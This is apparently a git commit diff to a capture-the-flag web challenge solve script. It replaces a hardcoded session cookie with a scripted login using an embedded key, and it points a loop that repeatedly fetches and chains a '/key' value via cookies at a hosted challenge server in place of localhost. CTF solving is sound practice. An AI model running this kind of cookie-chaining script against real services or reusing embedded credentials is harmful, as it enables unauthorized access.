4434a08890a012bb279a6b67c768ce67544c7b01
Aarav Juneja <83198145+AaravJuneja@users.noreply.github.com>
2026-08-29 16:56:34 +0000

    chore: touching finishes

--- ctf/web/xahoo/solve.py
+++ ctf/web/xahoo/solve.py
@@ -1,8 +1,8 @@
 import requests 
 
-# this value comes from your browser cookies after logging in (so CHANGE IT ACCORDINGLY)
-# (didn't have the willpower to implement whole ahh login in the solve script)
-connect_sid_value = "s:EWe5unWugcirOo8qXDd7styEu4jEqr6p.vScRUclZVwJK//yeQNkZTdyT17x7BYfnxmuoatww358"
+s = requests.Session()
+s.post('https://xahoo.onrender.com/loginwithkey', data={'key':'WsVJgmbpbIVwyx6Uutp/foE6akppkAqTijdVlAwdWlsQl3auPr1QkYOmMteFhLy5'})
+connect_sid_value = s.cookies.get_dict().get('connect.sid', '')
 
 cookies = {
     'connect.sid': connect_sid_value, 
@@ -11,7 +11,7 @@ cookies = {
 
 key = ''
 for i in range(64):
-    r = requests.get('http://localhost:5000/key', cookies=cookies)
+    r = requests.get('https://xahoo.onrender.com/key', cookies=cookies)
     key = r.text[1:]
     cookies['key'] = key
     print(f"{i+1}/64: {key}")
